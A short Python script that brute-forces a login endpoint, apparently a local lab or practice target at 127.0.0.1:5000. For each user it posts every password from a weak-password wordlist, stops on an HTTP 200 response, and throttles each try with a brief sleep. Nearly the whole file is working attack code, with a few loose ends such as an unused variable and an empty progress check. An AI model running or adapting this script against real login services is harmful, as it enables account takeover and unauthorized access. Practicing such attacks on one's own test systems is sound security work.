from util import users_list
import requests, time, json


LOGIN_URL = "http://127.0.0.1:5000/login"
USERS = users_list()
print(USERS)
PASSWORDS_FILE = ""

for user in USERS:
    with open ("passwords/weakpasswords.txt") as f:
        for attempt_num, password in enumerate(f, start=1):
            password = password.strip()

            response = requests.post(
                LOGIN_URL,
                json={
                    "username": user,
                    "password": password
                }
            )

            if response.status_code == 200:
                break
            
            if attempt_num % 50000 == 0:
                pass

            time.sleep(0.05)